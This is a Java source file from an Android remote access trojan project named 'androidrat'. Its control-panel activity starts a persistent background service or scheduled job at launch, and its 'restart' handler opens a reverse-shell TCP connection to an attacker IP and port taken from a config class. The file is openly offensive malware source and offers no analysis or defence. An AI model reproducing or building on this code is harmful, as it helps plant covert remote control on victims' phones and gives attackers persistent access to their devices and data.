package com.example.androidrat;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;

public class controlPanel extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control_panel);
        final Activity activity=this;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            new com.example.androidrat.functions(activity).jobScheduler(getApplicationContext());
        }else{
            activity.startService(new Intent(getApplicationContext(), com.example.androidrat.mainService.class));

        }

        findViewById(R.id.uninstall).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finish();
                Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
                intent.setData(Uri.parse("package:" + "com.example.androidrat"));
                intent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
                startActivityForResult(intent, 1);
            }
        });

        findViewById(R.id.restart).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finish();
                new com.example.reverseshell2.tcpConnection(activity,getApplicationContext()).execute(com.example.androidrat.config.IP, com.example.androidrat.config.port);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    new com.example.androidrat.functions(activity).jobScheduler(getApplicationContext());
                }else{
                    activity.startService(new Intent(getApplicationContext(), com.example.androidrat.mainService.class));

                }
            }
        });
    }
}